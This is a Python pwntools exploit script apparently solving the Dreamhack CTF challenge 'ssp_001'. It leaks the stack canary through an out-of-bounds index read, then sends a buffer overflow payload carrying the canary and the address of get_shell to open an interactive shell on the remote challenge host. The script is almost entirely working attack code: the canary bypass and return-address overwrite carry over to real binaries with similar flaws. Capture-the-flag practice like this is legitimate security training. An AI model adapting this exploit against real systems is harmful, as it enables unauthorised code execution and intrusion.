#!/usr/bin/env python3

from pwn import *

exe = ELF('ssp_001', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+313
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 11801)
else:
    p = process([exe.path])
GDB()

### STAGE 1: Leak Canary
canary_leak =  b'00';
sla(b'> ', b'P')
sla(b'index : ', b'129')
p.recvuntil(b'is : ')
canary_leak += (p.recvline()[:-1])[::-1]
sla(b'> ', b'P')
sla(b'index : ', b'130')
p.recvuntil(b'is : ')
canary_leak += (p.recvline()[:-1])[::-1]
sla(b'> ', b'P')
sla(b'index : ', b'131')
p.recvuntil(b'is : ')
canary_leak += (p.recvline()[:-1])[::-1]
canary_leak = canary_leak[::-1]
canary_leak = int(canary_leak, 16)
info("Canary leak: " + hex(canary_leak))

### STAGE 2: Get_shell
sla(b'> ', b'E')
sla(b'Size : ', b'200')
payload = flat(
    b'A'*64,
    p32(canary_leak),
    p32(0),
    p32(0),
    p32(exe.sym['get_shell']),
    )
sla(b'Name : ', payload)

p.interactive()
